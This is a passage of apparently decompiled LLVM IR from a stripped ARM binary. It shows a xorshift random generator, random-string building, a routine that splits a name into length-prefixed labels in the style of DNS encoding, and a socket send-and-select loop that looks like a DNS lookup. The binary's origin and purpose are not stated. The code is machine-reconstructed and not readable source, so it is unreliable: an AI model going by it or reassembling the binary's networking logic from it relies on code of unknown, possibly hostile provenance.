  store i32 %v2_90ec, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_932c = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_932c, i32* %r0.global-to-local, align 4
  %v5_9330 = call i32 @function_bfec(i32 %v2_932c, i32* nonnull %v4_90f8, i32 2, i32 16384)
  %v3_9334 = load i8*, i8** %stack_var_-34, align 4
  %v4_9334 = ptrtoint i8* %v3_9334 to i32
  %v4_9338 = urem i32 %v4_9298, 256
  %v4_933c = mul i32 %v4_9334, 256
  %v5_933c = or i32 %v4_933c, %v4_9338
  %v2_9344 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_9344, i32* %r0.global-to-local, align 4
  %v6_934c = inttoptr i32 %v5_933c to i8*
  store i8* %v6_934c, i8** %stack_var_-34, align 4
  br label %dec_label_pc_935c

dec_label_pc_935c:                                ; preds = %.thread3, %dec_label_pc_9320
  %storemerge15 = phi i32 [ %v2_92cc, %dec_label_pc_9320 ], [ %v2_90ec, %.thread3 ]
  %storemerge = phi i32 [ %v5_933c, %dec_label_pc_9320 ], [ 2, %.thread3 ]
  %v0_935c = phi i32 [ %v2_9344, %dec_label_pc_9320 ], [ %v3_9278, %.thread3 ]
  store i32 %storemerge15, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v4_935c = inttoptr i32 %storemerge15 to i32*
  %v5_935c = call i32 @function_bfec(i32 %v0_935c, i32* %v4_935c, i32 %storemerge, i32 16384)
  store i32 %v5_935c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f40

dec_label_pc_9364:                                ; preds = %dec_label_pc_8e78
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v6_8de4, i32* %r5.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_9294, { 2, 3, 0, 1 }
  uselistorder i32 %v5_9258, { 1, 0, 2 }
  uselistorder i32 %v1_921c, { 1, 0 }
  uselistorder i32 %v1_9128, { 1, 0 }
  uselistorder i32 %v2_91fc, { 2, 1, 0, 8, 5, 6, 4, 3, 7 }
  uselistorder i32 %v5_90ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9060, { 1, 0 }
  uselistorder i32 %v1_9038, { 1, 0 }
  uselistorder i32 %v5_9058, { 1, 0, 2 }
  uselistorder i32 %v3_8f9c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8f74, { 1, 2, 0 }
  uselistorder i32 %v1_8f54, { 1, 2, 0 }
  uselistorder i32* %v4_90f8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_90ec, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_9054, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32 %v2_8f6c, { 2, 1, 0 }
  uselistorder i32 %v2_8f4c, { 1, 2, 0 }
  uselistorder i32 %v1_8f24, { 1, 0 }
  uselistorder i32 %v2_8eec, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i8** %stack_var_-34, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %sb.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 5, 7, 6, 8, 9, 10, 14, 15, 11, 12, 13, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 12, 1, 2, 22, 23, 24, 25, 26, 28, 27, 29, 30, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 7, 8, 13, 11, 12, 14, 15, 10, 55, 57, 56, 59, 58, 60, 61, 64, 62, 63, 65, 1, 66, 9, 67, 2, 68, 54, 69, 16, 18, 17, 19, 21, 20, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 48, 50, 49, 52, 51, 53, 0 }
  uselistorder i8* bitcast (i8** @global_var_17428.106 to i8*), { 0, 3, 2, 1 }
  uselistorder i32* @global_var_172a4.104, { 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 7, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* @global_var_172a0.90, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 (i32)* @function_8c80, { 1, 0 }
  uselistorder [2 x i8]* @global_var_e210.88, { 1, 0 }
  uselistorder label %dec_label_pc_935c, { 1, 0 }
  uselistorder label %dec_label_pc_9304, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9178, { 1, 0 }
  uselistorder label %dec_label_pc_90fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9070, { 1, 0 }
  uselistorder label %dec_label_pc_9010, { 1, 0 }
  uselistorder label %dec_label_pc_8f40, { 7, 1, 0, 3, 4, 8, 5, 9, 6, 2, 10 }
  uselistorder label %dec_label_pc_8e78, { 1, 0 }
}

define i32 @function_939c() local_unnamed_addr {
dec_label_pc_939c:
  %v2_93a8 = load i32, i32* @global_var_1742c.112, align 4
  %v2_93ac = load i32, i32* @global_var_17438.114, align 4
  store i32 ptrtoint (i32* @global_var_17430.116 to i32), i32* @lr, align 4
  %v4_93b8 = mul i32 %v2_93a8, 2048
  %v5_93b8 = xor i32 %v4_93b8, %v2_93a8
  %v4_93bc = udiv i32 %v2_93ac, 524288
  %v5_93bc = xor i32 %v4_93bc, %v2_93ac
  %v2_93c0 = load i32, i32* @global_var_17430.116, align 4
  %v2_93c4 = load i32, i32* @global_var_17434.118, align 4
  %v2_93c8 = xor i32 %v5_93bc, %v5_93b8
  %v4_93cc = udiv i32 %v5_93b8, 256
  %v5_93cc = xor i32 %v2_93c8, %v4_93cc
  store i32 %v2_93c0, i32* @global_var_1742c.112, align 4
  store i32 %v2_93c4, i32* @global_var_17430.116, align 4
  store i32 %v2_93ac, i32* @global_var_17434.118, align 4
  store i32 %v5_93cc, i32* @global_var_17438.114, align 4
  ret i32 %v5_93cc

; uselistorder directives
  uselistorder i32 %v2_93ac, { 2, 1, 0 }
  uselistorder i32 %v2_93a8, { 1, 0 }
}

define i32 @function_93f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_93f4:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_93f4 = load i32, i32* @r4, align 4
  store i32 %v3_93f4, i32* %stack_var_-20, align 4
  %v0_93f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_94281 = add i32 %arg2, -1
  store i32 %v1_94281, i32* %r5.global-to-local, align 4
  %v3_942c2 = icmp eq i32 %arg2, 0
  store i32 ptrtoint ([27 x i8]* @global_var_172a8.120 to i32), i32* %r7.global-to-local, align 4
  %v1_94348 = add i32 %v0_93f8, 1
  store i32 %v1_94348, i32* %r6.global-to-local, align 4
  br i1 %v3_942c2, label %dec_label_pc_943c, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404
  %v0_9404 = call i32 @function_939c()
  %v0_940c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_940c, i32* @r0, align 4
  %v0_9410 = call i32 @function_ab0c()
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v2_941c = call i32 @function_b5dc(i32 %v0_9404, i32 %v0_9410)
  store i32 %v2_941c, i32* %r0.global-to-local, align 4
  %v2_9420 = add i32 %v0_940c, %v2_941c
  %v3_9420 = inttoptr i32 %v2_9420 to i8*
  %v4_9420 = load i8, i8* %v3_9420, align 1
  %v2_9424 = load i32, i32* %r6.global-to-local, align 4
  %v3_9424 = add i32 %v2_9424, -1
  %v4_9424 = inttoptr i32 %v3_9424 to i8*
  store i8 %v4_9420, i8* %v4_9424, align 1
  %v0_9428.pr = load i32, i32* %r5.global-to-local, align 4
  %v1_9428 = add i32 %v0_9428.pr, -1
  store i32 %v1_9428, i32* %r5.global-to-local, align 4
  %v3_942c = icmp eq i32 %v0_9428.pr, 0
  store i32 ptrtoint ([27 x i8]* @global_var_172a8.120 to i32), i32* %r7.global-to-local, align 4
  %v0_9434 = load i32, i32* %r6.global-to-local, align 4
  %v1_9434 = add i32 %v0_9434, 1
  store i32 %v1_9434, i32* %r6.global-to-local, align 4
  br i1 %v3_942c, label %dec_label_pc_9428.dec_label_pc_943c_crit_edge, label %dec_label_pc_9404

dec_label_pc_9428.dec_label_pc_943c_crit_edge:    ; preds = %dec_label_pc_9404
  %v2_943c.pre = load i32, i32* %stack_var_-20, align 4
  %v17_943c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_9428.dec_label_pc_943c_crit_edge, %dec_label_pc_93f4
  %v17_943c = phi i32 [ %v17_943c.pre, %dec_label_pc_9428.dec_label_pc_943c_crit_edge ], [ %v0_93f8, %dec_label_pc_93f4 ]
  %v2_943c = phi i32 [ %v2_943c.pre, %dec_label_pc_9428.dec_label_pc_943c_crit_edge ], [ %v3_93f4, %dec_label_pc_93f4 ]
  store i32 %v2_943c, i32* @r4, align 4
  ret i32 %v17_943c

; uselistorder directives
  uselistorder i32 %v0_9404, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder i32 ptrtoint ([27 x i8]* @global_var_172a8.120 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_9404, { 1, 0 }
}

define i32 @function_9444() local_unnamed_addr {
dec_label_pc_9444:
  %stack_var_-12 = alloca i32, align 4
  %v3_9444 = load i32, i32* @r4, align 4
  store i32 %v3_9444, i32* %stack_var_-12, align 4
  %v2_944c = call i32 @function_bad0(i32* null)
  store i32 %v2_944c, i32* @global_var_1742c.112, align 4
  %v0_9458 = call i32 @function_b900()
  store i32 %v0_9458, i32* @r4, align 4
  %v0_9460 = call i32 @function_b92c()
  %v0_9468 = load i32, i32* @r4, align 4
  %v2_9468 = xor i32 %v0_9468, %v0_9460
  store i32 %v2_9468, i32* @r4, align 4
  store i32 %v2_9468, i32* @global_var_17430.116, align 4
  %v1_9470 = call i32 @function_bde0(i32 %v0_9460)
  %v2_9474 = load i32, i32* @global_var_17430.116, align 4
  %v2_947c = xor i32 %v2_9474, %v1_9470
  store i32 %v2_947c, i32* @global_var_17438.114, align 4
  store i32 %v1_9470, i32* @global_var_17434.118, align 4
  %v2_948c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_948c, i32* @r4, align 4
  ret i32 %v1_9470

; uselistorder directives
  uselistorder i32 %v1_9470, { 1, 2, 0 }
  uselistorder i32 %v0_9460, { 1, 0 }
  uselistorder i32* @global_var_17434.118, { 1, 0, 2 }
  uselistorder i32* @global_var_17438.114, { 1, 0, 2 }
  uselistorder i32* @global_var_17430.116, { 2, 1, 0, 3, 4 }
  uselistorder i32* @global_var_1742c.112, { 1, 0, 2 }
}

define i32 @function_94a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_94a0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp49 = call i8 @__decompiler_undefined_function_1()
  %tmp50 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-4272 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-2224 = alloca i32, align 4
  %stack_var_-2236 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_94a0 = load i32, i32* @r4, align 4
  store i32 %v3_94a0, i32* %stack_var_-36, align 4
  %v6_94a0 = load i32, i32* @r5, align 4
  %v9_94a0 = load i32, i32* @r6, align 4
  %v12_94a0 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_94b0 = call i32 @function_ab0c()
  store i32 %v0_94b0, i32* %r5.global-to-local, align 4
  %v0_94b8 = call i32 @function_af48()
  %v2_94c4 = ptrtoint i32* %stack_var_-2236 to i32
  store i32 %v2_94c4, i32* @r6, align 4
  %v2_94c8 = ptrtoint i32* %stack_var_-2224 to i32
  store i32 %v2_94c8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_952819 = load i32, i32* %r5.global-to-local, align 4
  %v3_952821 = icmp eq i32 %v1_952819, 0
  store i1 %v3_952821, i1* %cpsr_z.global-to-local, align 1
  %v5_952c28 = icmp sgt i32 %v1_952819, 0
  br i1 %v5_952c28, label %dec_label_pc_94e0, label %dec_label_pc_9530

dec_label_pc_94e0:                                ; preds = %dec_label_pc_94a0, %dec_label_pc_9524
  %v1_952837 = phi i32 [ %v1_9528, %dec_label_pc_9524 ], [ %v1_952819, %dec_label_pc_94a0 ]
  %v2_94f8 = phi i32 [ %v0_94f035, %dec_label_pc_9524 ], [ %v2_94c8, %dec_label_pc_94a0 ]
  %v1_94f4 = phi i32 [ %v0_94ec33, %dec_label_pc_9524 ], [ 0, %dec_label_pc_94a0 ]
  %v1_94ec = phi i32 [ %v1_9524, %dec_label_pc_9524 ], [ 0, %dec_label_pc_94a0 ]
  %v1_94e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_94e0 = add i32 %v1_94e0, %v1_94ec
  %v3_94e0 = inttoptr i32 %v2_94e0 to i8*
  %v4_94e0 = load i8, i8* %v3_94e0, align 1
  %v6_94e0 = zext i8 %v4_94e0 to i32
  store i32 %v6_94e0, i32* %r3.global-to-local, align 4
  %v7_94e4 = icmp eq i8 %v4_94e0, 46
  store i1 %v7_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94e4, label %dec_label_pc_94ec, label %dec_label_pc_9524

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94e0
  %v2_94ec = sub i32 %v1_94ec, %v1_94f4
  store i32 %v2_94ec, i32* %r3.global-to-local, align 4
  store i32 %v2_94f8, i32* %r1.global-to-local, align 4
  %v2_94f4 = add i32 %v1_94e0, %v1_94f4
  store i32 %v2_94f4, i32* %r2.global-to-local, align 4
  %v1_94f8 = trunc i32 %v2_94ec to i8
  %v3_94f8 = inttoptr i32 %v2_94f8 to i8*
  store i8 %v1_94f8, i8* %v3_94f8, align 1
  br label %dec_label_pc_9508

dec_label_pc_9500:                                ; preds = %dec_label_pc_9508
  %v2_9500 = inttoptr i32 %v0_9514 to i8*
  %v3_9500 = load i8, i8* %v2_9500, align 1
  %v4_9500 = zext i8 %v3_9500 to i32
  store i32 %v4_9500, i32* %r3.global-to-local, align 4
  %v3_9504 = inttoptr i32 %v1_9510 to i8*
  store i8 %v3_9500, i8* %v3_9504, align 1
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9500
  %v0_9508 = load i32, i32* %lr.global-to-local, align 4
  %v1_9508 = load i32, i32* %ip.global-to-local, align 4
  %v9_9508 = icmp eq i32 %v0_9508, %v1_9508
  store i1 %v9_9508, i1* %cpsr_z.global-to-local, align 1
  %v1_950c = add i32 %v0_9508, 1
  store i32 %v1_950c, i32* %r3.global-to-local, align 4
  %v0_9510 = load i32, i32* %r1.global-to-local, align 4
  %v1_9510 = add i32 %v0_9510, 1
  store i32 %v1_9510, i32* %r1.global-to-local, align 4
  %v0_9514 = load i32, i32* %r2.global-to-local, align 4
  %v1_9514 = add i32 %v0_9514, 1
  store i32 %v1_9514, i32* %r2.global-to-local, align 4
  store i32 %v1_950c, i32* %lr.global-to-local, align 4
  %v5_951c = icmp slt i32 %v0_9508, %v1_9508
  br i1 %v5_951c, label %dec_label_pc_9500, label %dec_label_pc_9520

dec_label_pc_9520:                                ; preds = %dec_label_pc_9508
  %v1_9528.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9524

dec_label_pc_9524:                                ; preds = %dec_label_pc_94e0, %dec_label_pc_9520
  %v1_9528 = phi i32 [ %v1_952837, %dec_label_pc_94e0 ], [ %v1_9528.pre, %dec_label_pc_9520 ]
  %v0_9524 = phi i32 [ %v1_94ec, %dec_label_pc_94e0 ], [ %v1_9508, %dec_label_pc_9520 ]
  %v0_94f035 = phi i32 [ %v2_94f8, %dec_label_pc_94e0 ], [ %v1_9510, %dec_label_pc_9520 ]
  %v0_94ec33 = phi i32 [ %v1_94f4, %dec_label_pc_94e0 ], [ %v1_950c, %dec_label_pc_9520 ]
  %v1_9524 = add i32 %v0_9524, 1
  store i32 %v1_9524, i32* %ip.global-to-local, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  %v5_952c = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v5_952c, label %dec_label_pc_94e0, label %dec_label_pc_9528.dec_label_pc_9530_crit_edge

dec_label_pc_9528.dec_label_pc_9530_crit_edge:    ; preds = %dec_label_pc_9524
  %v2_9534.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_9530

dec_label_pc_9530:                                ; preds = %dec_label_pc_9528.dec_label_pc_9530_crit_edge, %dec_label_pc_94a0
  %v3_9534 = phi i32 [ %v1_9528, %dec_label_pc_9528.dec_label_pc_9530_crit_edge ], [ %v1_952819, %dec_label_pc_94a0 ]
  %v2_9534 = phi i32 [ %v2_9534.pre, %dec_label_pc_9528.dec_label_pc_9530_crit_edge ], [ %v2_94c8, %dec_label_pc_94a0 ]
  store i32 0, i32* @r4, align 4
  %v4_9534 = add i32 %v2_9534, %v3_9534
  %v5_9534 = inttoptr i32 %v4_9534 to i8*
  store i8 0, i8* %v5_9534, align 1
  %v0_9538 = call i32 @function_939c()
  store i32 65535, i32* %r1.global-to-local, align 4
  %v2_9540 = call i32 @function_b5dc(i32 %v0_9538, i32 65535)
  %v3_9544 = mul i32 %v2_9540, 65536
  store i32 %v3_9544, i32* %r3.global-to-local, align 4
  store i32 %v2_94c8, i32* @r0, align 4
  %v3_954c = urem i32 %v2_9540, 65536
  store i32 %v3_954c, i32* %fp.global-to-local, align 4
  %v0_9550 = call i32 @function_ab0c()
  %v1_9554 = add i32 %v0_9550, 17
  store i32 %v2_94c8, i32* @r0, align 4
  %v0_9560 = call i32 @function_ab0c()
  store i32 2056, i32* %r1.global-to-local, align 4
  %v0_9568 = load i32, i32* %r8.global-to-local, align 4
  %v2_9568 = add i32 %v0_9568, %v0_9560
  store i32 %v2_9568, i32* @r5, align 4
  %v3_9570 = call i32 @function_c34c(i32 1, i32 2056)
  %v2_9574 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_9574, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_958c = load i32, i32* @r5, align 4
  %v2_958c = add i32 %v0_958c, 1
  store i32 %v2_958c, i32* %r1.global-to-local, align 4
  store i32 %v3_9570, i32* %sl.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_9598 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9598, i32* %stack_var_-2236, align 4
  %v0_95c4 = load i32, i32* @r4, align 4
  %v1_95c4 = trunc i32 %v0_95c4 to i8
  %v4_95c4 = inttoptr i32 %v2_958c to i8*
  store i8 %v1_95c4, i8* %v4_95c4, align 1
  %v0_95c8 = load i32, i32* @r4, align 4
  %v1_95c8 = trunc i32 %v0_95c8 to i8
  %v2_95c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_95c8 = add i32 %v2_95c8, 2
  %v4_95c8 = inttoptr i32 %v3_95c8 to i8*
  store i8 %v1_95c8, i8* %v4_95c8, align 1
  %v0_95cc = load i32, i32* %r3.global-to-local, align 4
  %v1_95cc = trunc i32 %v0_95cc to i8
  %v2_95cc = load i32, i32* %r1.global-to-local, align 4
  %v3_95cc = add i32 %v2_95cc, 1
  %v4_95cc = inttoptr i32 %v3_95cc to i8*
  store i8 %v1_95cc, i8* %v4_95cc, align 1
  %v0_95d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i8
  %v2_95d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_95d0 = add i32 %v2_95d0, 3
  %v4_95d0 = inttoptr i32 %v3_95d0 to i8*
  store i8 %v1_95d0, i8* %v4_95d0, align 1
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_9604 = ptrtoint i32* %stack_var_-60 to i32
  %v3_960c = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_967c = ptrtoint i32* %stack_var_-188 to i32
  %v2_969c = ptrtoint i32* %stack_var_-36 to i32
  %v2_96c8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_9708 = ptrtoint i32* %stack_var_-4284 to i32
  %v2_9750 = ptrtoint i32* %stack_var_-4272 to i32
  %v2_9768 = add i32 %v2_969c, -4248
  %v3_9768 = inttoptr i32 %v2_9768 to i8*
  %v4_976c = zext i8 %tmp50 to i32
  %v4_9770 = mul nuw nsw i32 %v4_976c, 256
  %v4_9788 = zext i8 %tmp49 to i32
  %v4_978c = zext i8 %tmp to i32
  %v4_9790 = mul nuw nsw i32 %v4_978c, 256
  %v5_9790 = or i32 %v4_9790, %v4_9788
  %v7_9790 = icmp eq i32 %v5_9790, 0
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_98bc.dec_label_pc_95d8_crit_edge, %dec_label_pc_9530
  %v1_95dc = phi i32 [ -1, %dec_label_pc_9530 ], [ %v0_95d8.pre, %dec_label_pc_98bc.dec_label_pc_95d8_crit_edge ]
  %stack_var_-4288.0 = phi i8 [ 1, %dec_label_pc_9530 ], [ %v5_98d0, %dec_label_pc_98bc.dec_label_pc_95d8_crit_edge ]
  %v7_95d8 = icmp eq i32 %v1_95dc, -1
  store i1 %v7_95d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95d8, label %bb87, label %bb

bb:                                               ; preds = %dec_label_pc_95d8
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_95d8, %bb
  store i32 38372, i32* @lr, align 4
  %v1_95e0 = xor i1 %v7_95d8, true
  call void @__pseudo_cond_branch(i1 %v1_95e0, i32 ptrtoint (i32* @global_var_b880.127 to i32))
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_95f0 = call i32 @function_c0a8(i32 2, i32 2, i32 0)
  %v7_95f4 = icmp eq i32 %v3_95f0, -1
  store i1 %v7_95f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_95f0, i32* %sb.global-to-local, align 4
  br i1 %v7_95f4, label %dec_label_pc_961c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %bb87
  store i32 %v2_9604, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_960c = call i32 @function_bf38(i32 %v3_95f0, %sockaddr* %v3_960c, i32 16)
  %v3_9610 = icmp eq i32 %v4_960c, -1
  %v8_9610 = icmp eq i32 %v4_960c, -1
  store i1 %v8_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9610, label %dec_label_pc_961c, label %dec_label_pc_9624

dec_label_pc_961c:                                ; preds = %dec_label_pc_9600, %bb87, %dec_label_pc_9624
  %v1_961c = call i32 @function_c82c(i32 1)
  br label %dec_label_pc_98bc

dec_label_pc_9624:                                ; preds = %dec_label_pc_9600
  store i32 %v2_94c4, i32* %r1.global-to-local, align 4
  %v0_9630 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_9554, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_963c = call i32 @function_c04c(i32 %v0_9630, i32* nonnull %stack_var_-2236, i32 %v1_9554, i32 16384)
  store i32 %v1_9554, i32* @lr, align 4
  %v9_9644 = icmp eq i32 %v5_963c, %v1_9554
  store i1 %v9_9644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9644, label %dec_label_pc_9654, label %dec_label_pc_961c

dec_label_pc_9654:                                ; preds = %dec_label_pc_9624
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v0_965c = load i32, i32* %sb.global-to-local, align 4
  %v2_9660 = call i32 @function_b790(i32 %v0_965c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9668 = or i32 %v2_9660, 2048
  store i32 %v1_9668, i32* @r2, align 4
  %v2_9670 = call i32 @function_b790(i32 %v0_965c, i32 4)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9678

dec_label_pc_9678:                                ; preds = %dec_label_pc_9678, %dec_label_pc_9654
  %v1_9684 = phi i32 [ %v1_9688, %dec_label_pc_9678 ], [ 0, %dec_label_pc_9654 ]
  store i32 %v2_967c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v3_9684 = add i32 %v1_9684, %v2_967c
  %v4_9684 = inttoptr i32 %v3_9684 to i32*
  store i32 0, i32* %v4_9684, align 4
  %v0_9688 = load i32, i32* %r3.global-to-local, align 4
  %v1_9688 = add i32 %v0_9688, 4
  store i32 %v1_9688, i32* %r3.global-to-local, align 4
  %v7_968c = icmp eq i32 %v1_9688, 128
  br i1 %v7_968c, label %dec_label_pc_9694, label %dec_label_pc_9678

dec_label_pc_9694:                                ; preds = %dec_label_pc_9678
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_9698 = load i32, i32* %sb.global-to-local, align 4
  %v3_9698 = udiv i32 %v0_9698, 32
  store i32 %v3_9698, i32* %r3.global-to-local, align 4
  store i32 %v2_969c, i32* %r2.global-to-local, align 4
  %v4_96a0 = mul nuw nsw i32 %v3_9698, 4
  %v5_96a0 = add i32 %v4_96a0, %v2_969c
  store i32 %v5_96a0, i32* @r4, align 4
  %v1_96a4 = add i32 %v5_96a0, -152
  %v2_96a4 = inttoptr i32 %v1_96a4 to i32*
  %v3_96a4 = load i32, i32* %v2_96a4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_96ac = urem i32 %v0_9698, 32
  store i32 %v1_96ac, i32* @r5, align 4
  %v7_96b0 = shl i32 1, %v1_96ac
  %v8_96b0 = or i32 %v3_96a4, %v7_96b0
  store i32 %v2_9574, i32* @lr, align 4
  store i32 %v8_96b0, i32* %v2_96a4, align 4
  store i32 10, i32* %stack_var_-44, align 4
  store i32 %v2_96c8, i32* %ip.global-to-local, align 4
  %v0_96cc = load i32, i32* %sb.global-to-local, align 4
  %v1_96cc = load i32, i32* %r3.global-to-local, align 4
  %v2_96cc = add i32 %v1_96cc, %v0_96cc
  %v0_96d4 = load i32, i32* @r7, align 4
  store i32 %v0_96d4, i32* %r2.global-to-local, align 4
  store i32 %v0_96d4, i32* %r3.global-to-local, align 4
  %v5_96e0 = call i32 @function_ba74(i32 %v2_96cc, i32 %v2_967c, i32 %v0_96d4, i32 %v0_96d4, i32 %v2_96c8)
  %v7_96e4 = icmp eq i32 %v5_96e0, -1
  store i1 %v7_96e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96e4, label %dec_label_pc_98dc, label %dec_label_pc_96ec

dec_label_pc_96ec:                                ; preds = %dec_label_pc_9694
  %v1_96ec = load i32, i32* @r7, align 4
  %v9_96ec = icmp eq i32 %v5_96e0, %v1_96ec
  store i1 %v9_96ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_96ec, label %dec_label_pc_98bc, label %dec_label_pc_96f4

dec_label_pc_96f4:                                ; preds = %dec_label_pc_96ec
  %v0_96f4 = load i32, i32* @r4, align 4
  %v1_96f4 = add i32 %v0_96f4, -152
  %v2_96f4 = inttoptr i32 %v1_96f4 to i32*
  %v3_96f4 = load i32, i32* %v2_96f4, align 4
  %v1_96f8 = load i32, i32* @r5, align 4
  %v6_96f8 = ashr i32 %v3_96f4, %v1_96f8
  store i32 %v6_96f8, i32* %r3.global-to-local, align 4
  %v1_96fc = urem i32 %v6_96f8, 2
  %v2_96fc = icmp eq i32 %v1_96fc, 0
  store i1 %v2_96fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_96fc, label %dec_label_pc_98bc, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96f4
  store i32 %v2_9708, i32* @r5, align 4
  store i32 %v1_96ec, i32* %r1.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  %v3_9718 = call i32 @function_aba4(i32 %v2_9708, i32 %v1_96ec, i32 2048)
  store i32 %v2_9708, i32* %r1.global-to-local, align 4
